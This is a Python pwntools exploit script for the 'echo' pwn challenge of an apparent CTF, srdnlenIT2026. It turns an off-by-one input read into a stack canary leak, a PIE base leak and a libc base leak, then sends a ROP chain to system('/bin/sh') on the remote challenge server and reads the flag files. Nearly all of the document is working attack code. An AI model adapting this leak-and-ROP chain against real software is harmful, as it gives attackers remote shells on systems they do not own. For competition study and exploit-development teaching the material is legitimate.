#!/usr/bin/env python3
"""
Challenge: echo
Category:  pwn
Platform:  srdnlenIT2026
Vuln:      Off-by-one in read_stdin (jae instead of ja) + no null-terminate on overflow path
"""
from pwn import *
import sys

context.binary = elf = ELF('./echo', checksec=False)
context.log_level = 'info'

HOST, PORT = 'echo.challs.srdnlen.it', 1091

# __libc_start_call_main ret offset (after call *%rax at 0x2a1c8)
LIBC_START_RET = 0x2a1ca

def get_process():
    if args.REMOTE: return remote(HOST, PORT)
    elif args.GDB:  return gdb.debug('./echo', gdbscript='b *echo+0x8d\nc')
    else:           return process('./echo')

def exploit():
    libc_obj = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    for attempt in range(50):
        try:
            p = get_process()
            p.recvuntil(b'echo ')

            # === R1: set max_len = 0x48 ===
            # Default max_len=0x40, reads 65 bytes. Byte 64 = new max_len.
            p.send(b'A' * 64 + b'\x48')
            p.recvuntil(b'echo ')

            # === R2: leak canary, set max_len = 0x58 ===
            # max_len=0x48=72, reads 73 bytes. Byte 72 overwrites canary[0] (null byte).
            # No null-terminate on overflow path → puts leaks canary[1..7].
            payload2 = b'B' * 64 + b'\x58' + b'C' * 7 + b'X'  # 73 bytes
            p.send(payload2)
            data = p.recvuntil(b'echo ')
            line = data.split(b'\n')[0]
            extra = line[73:]
            if len(extra) < 7:
                p.close()
                continue
            canary = u64(b'\x00' + extra[:7])
            log.info(f'Canary: {hex(canary)}')

            # === R3: leak PIE base, set max_len = 0x77 ===
            # max_len=0x58=88, reads 89 bytes. Byte 88 overwrites ret[0].
            # Known ret[0] = 0x42 (from PIE+0x1342). Leak ret[1..5] → PIE base.
            payload3 = b'D' * 64 + b'\x77' + b'C' * 7 + b'X' * 8 + b'Y' * 8 + b'Z'
            p.send(payload3)
            data = p.recvuntil(b'echo ')
            line = data.split(b'\n')[0]
            extra3 = line[89:]
            if len(extra3) < 5:
                p.close()
                continue
            ret_addr = u64(b'\x42' + extra3[:5] + b'\x00\x00')
            pie = ret_addr - 0x1342
            if pie & 0xfff != 0:
                p.close()
                continue
            log.info(f'PIE base: {hex(pie)}')

            # === R4: leak libc, set max_len = 0xFF ===
            # max_len=0x77=119, reads 120 bytes. Fill all with non-null.
            # No null-terminate → puts leaks __libc_start_main_ret at offset 120+.
            # Stack layout from s[0]:
            #   0-63:   buffer s
            #   64:     var_10h
            #   65-71:  padding
            #   72-79:  canary
            #   80-87:  echo's saved_rbp
            #   88-95:  echo's ret addr
            #   96-103: main's argv
            #   104-107: gap
            #   108-111: main's argc (contains nulls! → must overwrite)
            #   112-119: main's saved_rbp
            #   120-127: __libc_start_main_ret (LEAK TARGET)
            payload4 = b'E' * 64       # s
            payload4 += b'\xff'         # var_10h = 0xFF for R5
            payload4 += b'C' * 7        # padding
            payload4 += b'D' * 8        # canary (garbage, loop continues)
            payload4 += b'E' * 8        # echo's saved_rbp
            payload4 += b'F' * 8        # echo's ret addr
            payload4 += b'G' * 24       # main's frame (argv + gap/argc + saved_rbp)
            assert len(payload4) == 120
            p.send(payload4)

            data = p.recvuntil(b'echo ', timeout=5)
            line = data.split(b'\n')[0]
            if len(line) < 126:
                log.warning(f"Libc leak short ({len(line)} bytes)")
                p.close()
                continue

            libc_bytes = line[120:126]
            libc_ret = u64(libc_bytes + b'\x00\x00')
            libc_base = libc_ret - LIBC_START_RET
            if libc_base & 0xfff != 0:
                log.warning(f"Libc not aligned: {hex(libc_base)}")
                p.close()
                continue
            log.info(f'Libc base: {hex(libc_base)}')

            # === R5: ROP → shell ===
            # max_len=0xFF, reads 256 bytes. Full overflow.
            # s[0]=\x00 → exit echo loop → canary check → leave;ret → ROP
            pop_rdi = libc_base + libc_obj.search(asm('pop rdi; ret')).__next__()
            system_addr = libc_base + libc_obj.symbols['system']
            bin_sh = libc_base + next(libc_obj.search(b'/bin/sh\x00'))
            ret_gadget = pie + 0x101a

            log.info(f'system: {hex(system_addr)}')
            log.info(f'/bin/sh: {hex(bin_sh)}')

            payload5 = b'\x00'              # s[0] = null → exit loop
            payload5 += b'F' * 63           # s[1..63]
            payload5 += b'\xff'             # var_10h
            payload5 += b'G' * 7            # padding
            payload5 += p64(canary)          # restore canary
            payload5 += p64(0)               # saved_rbp
            payload5 += p64(ret_gadget)      # stack alignment
            payload5 += p64(pop_rdi)         # pop rdi; ret
            payload5 += p64(bin_sh)          # "/bin/sh"
            payload5 += p64(system_addr)     # system()
            # NOTE: max_len=0xFF causes counter byte to wrap (0x100→0x00),
            # creating an infinite loop. Must terminate with '\n'.
            payload5 += b'\n'

            p.send(payload5)

            # Verify shell
            import time
            time.sleep(0.5)
            p.sendline(b'id')
            try:
                resp = p.recv(timeout=3)
                if b'uid' in resp:
                    log.success(f'Shell! {resp.decode().strip()}')
                    p.sendline(b'cat /flag* 2>/dev/null; cat flag* 2>/dev/null')
                    flag = p.recv(timeout=3)
                    log.success(f'Flag: {flag.decode().strip()}')
                    p.interactive()
                    return
                else:
                    log.warning(f'No shell: {resp}')
                    p.close()
                    continue
            except:
                log.warning('No response after ROP')
                p.close()
                continue

        except EOFError:
            log.warning(f"EOF at attempt {attempt}")
            try: p.close()
            except: pass
        except Exception as e:
            log.warning(f'Attempt {attempt}: {e}')
            try: p.close()
            except: pass

    log.error("All attempts failed")

if __name__ == "__main__":
    exploit()
